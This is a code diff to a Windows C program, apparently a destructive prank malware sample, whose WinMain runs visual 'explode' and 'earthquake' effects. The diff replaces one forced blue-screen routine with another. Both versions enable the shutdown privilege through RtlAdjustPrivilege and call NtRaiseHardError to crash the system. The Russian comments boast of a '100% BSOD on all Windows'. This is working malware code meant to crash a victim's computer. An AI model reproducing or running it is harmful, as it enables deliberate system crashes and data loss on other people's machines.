@@ -1061,18 +1061,16 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     HANDLE t16 = CreateThread(0, 0, screen_explode, 0, 0, 0); sound_explode(); Sleep(20000); TerminateThread(t16, 0); CloseHandle(t16);
     HANDLE t17 = CreateThread(0, 0, earthquake_shake, 0, 0, 0); sound_quake(); Sleep(20000); TerminateThread(t17, 0); CloseHandle(t17);
 
-    // ====== ГАРАНТИРОВАННЫЙ BSOD ======
-    // Вызов KeBugCheckEx через NtRaiseHardError с STATUS_SYSTEM_PROCESS_TERMINATED
-    BOOLEAN bl;
-    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
-    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
-    
-    if (RtlAdjustPrivilege && NtRaiseHardError) {
-        RtlAdjustPrivilege(19, 1, 0, &bl);
-        // STATUS_SYSTEM_PROCESS_TERMINATED = 0xC000021A
-        NtRaiseHardError(0xC000021A, 0, 0, 0, 6, NULL);
-    }
-    
-    Sleep(-1);
-    return 0;
+    // ====== 100% BSOD НА ВСЕХ WINDOWS ======
+BOOLEAN bl;
+NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
+RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
+
+if (RtlAdjustPrivilege && NtRaiseHardError) {
+    RtlAdjustPrivilege(19, 1, 0, &bl);
+    NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
+}
+
+Sleep(-1);
+return 0;
 }
